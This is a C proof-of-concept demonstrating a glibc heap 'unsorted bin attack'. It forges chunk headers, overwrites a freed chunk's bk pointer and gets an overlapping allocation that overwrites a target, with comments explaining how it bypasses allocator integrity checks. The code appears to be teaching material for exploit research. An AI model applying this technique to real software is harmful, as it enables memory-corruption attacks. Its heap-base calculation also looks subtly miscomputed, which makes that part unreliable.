
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

typedef unsigned long ul;


int main() {
	// Author : Maher Azzouzi (https://twitter.com/azz_maher)
	// Unsorted bin attack v1.1, works on glibc 2.34 (and older versions)
	// this PoC take care of all the mitigations for unsorted bin corruption.

	// This attack will show a heap overflow using a new unsorted
	// bin attack, this heap overflow can allow other attacks like
	// corrupting the size of the chunk for example, or overwriting the
	// `fd` of a tcache chunk to get a chunk anywhere.
	//
	// This attack will overwrite only the (bk) of a freed
	// unsorted bin chunk (like the old unsorted bin attack).
	//
	// The same attack can be performed in the stack to get a ROP chain,
	// for that you need stack, heap and libc leaks.
	// For me I will overwrite something in the heap so I will need
	// libc and heap leaks.

	setbuf(stdin, NULL);
	setbuf(stdout, NULL);
	
	// We will put our fake metadata here.
	ul* fake_chunk = (ul*)malloc(sizeof(ul)*4);

	// Target to overwrite.
	ul* target = (ul*)malloc(8);
	
	printf("target : 0x%lx\n", target[0]);

	// A check for the existence of the next chunk (from our fake_chunk)
	// will be performed, so we will make fake headers here.
	// note that the prev_size should be equal to our fake chunk size. 
	// (you will see that) 
	// "malloc(): mismatching next->prev_size (unsorted)"
	ul* fake_next_chunk = (ul*)malloc(0x500);
	

	// Our target chunk, this will go to unsorted bin.
	// Any size can do the attack (if it's a tcache size
	// you need to fill tcache first)
	ul* p = (ul*)malloc(0x410);

	// To not consolidate with the top chunk.
	malloc(0x1);
	
	// make (p) in unsorted bin.
	free(p);
	
	// You can get your leaks using any method you want, here I'm getting
	// them directly
	ul unsorted_bin_entry = p[0]; // this is a libc leak
	ul heap_base = p - 0x2a0; // heap leak
	
	// Here we are creating a fake header, we can choose any size we want
	// as unsorted bin can hold variety of sizes (preferably you want
	// to choose an unsorted bin size to not fill the tcache), 
	// you need to choose a size that can cover the chunk you want to overwrite (target)
	// and at the same time having it's next chunk (in memory) 
	// having an acceptable chunk header.
	// I will be using 0x450 as my fake size, it can be smaller or bigger.
	
	// prev_size
	fake_chunk[0] = 0x0;

	// size
	fake_chunk[1] = 0x451;

	// fake_chunk->fwd (to bypass some checks)
	// recall that p is the freed chunk in unsorted bin.
	fake_chunk[2] = (ul)((ul)p - 0x10);

	// fake_chunk->bk (this is a libc address)
	// or more precisely fake_chunk->bk = (p->fd)+0x8;
   	fake_chunk[3] = unsorted_bin_entry + 0x8;


	// Now we will fill fake_next_chunk so that the next chunk of our
	// fake_chunk look correct, and bypass some checks.
	
	for(int i=0; i<0x98; i+=2) {
		// prev_size should be the size we specified with no flags.
		fake_next_chunk[i]   = 0x450;

		// prev_inuse flag should NOT be set.
		fake_next_chunk[i+1] = 0x20;
	}

	// This is how it looks in memory until now: 
	// 					: 0x0 						0x31
	// fake_chunk 				: 0x0						0x451
	// fake_chunk <+0x10>			: 0x5555....(p-0x10)					0x7ffff...((p->fd)+0x8)
	//
	// 					: 0x0						0x21
	// target 				: 0x0 						0x0
	//
	// 					: 0x0 						0x511
	// fake_next_chunk 			: 0x450 					0x20
	// fake_next_chunk <+0x10>		: 0x450 					0x20
	// fake_next_chunk <+0x20>		: 0x450 					0x20
	// ...							...
	// fake_next_chunk <+0x390> 		: 0x450						0x20
	// ...							...
	

	//------------VULNERABILITY : WAF ----
	// The vulnerability is here, we're making that freed unsorted bin
	// chunk p->bk pointing to our fake_chunk
	// p->bk = fake_chunk.
	p[1] = fake_chunk;
	//------------------------------------
	
	// The first chunk that we will get is close to our target, we can
	// overwrite it now. Our target can be anything that can unlock other
	// attacks.
	ul* overflow_chunk = (ul*)malloc(0x440);
	memset(overflow_chunk, 'M', 0x440);
	
	printf("target : 0x%lx\n", target[0]);
}
